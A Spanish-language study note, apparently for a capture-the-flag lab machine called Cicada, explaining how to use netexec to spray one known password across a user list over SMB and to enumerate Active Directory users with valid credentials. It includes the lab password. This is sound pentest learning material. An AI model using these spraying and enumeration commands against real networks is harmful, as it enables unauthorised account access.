#netexec

---

Se usa para reconocimiento de red, movimiento lateral y evaluaciones de seguridad, así como para ayudar con pruebas de autenticación automatizadas contra sistemas remotos en un entorno de Active Directory.
Lo podemos usar para hacer por ejemplo fuerza bruta, si tenemos una contraseña y un listado de posibles usuarios. Pero no se le puede pasar el rockyou ni diccionarios grandes, por que da error
	![[Cicada14.png]]
"too many values to unpack"

----
# Hacer fuerza bruta a usuarios cuando tenemos contraseña

```shell
netexec Servicio Ip -u ArchivoConUsuarios -p 'Contraseña' --no-bruteforce
Ejemplo: netexec smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --no-bruteforce
```

*Parametros*
	`Servicio` Puede ser smb,rpc/dcom,etc
	`Ip` Ip de la maquina
	`-u` Es para poner el usuario, puede ser un nombre o un archivo
	`-p` Es para la contraseña, puede ser la contraseña en texto o un diccionario
	`--no-bruteforce` No intenta adivinar contraseñas/usuarios adicionales, solo usa lo que le dimos

---
# Listar usuarios con credenciales validas}


```
netexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```
	
	`Servicio` Puede ser smb,rpc/dcom,etc
	`Ip` Ip de la maquina
	`-u` Es para poner el usuario, puede ser un nombre o un archivo
	`-p` Es para la contraseña, puede ser la contraseña en texto o un diccionario
	`--users` Es para listar los usuarios del sistema

![[Cicada16.png]]
Eetexec nos va a mostrar parámetros adicionales del usuario, como la descripción, membresias de grupo e información de perfil. A diferencia del [[impacket-lookupsid]] que solamente muestra los usuarios
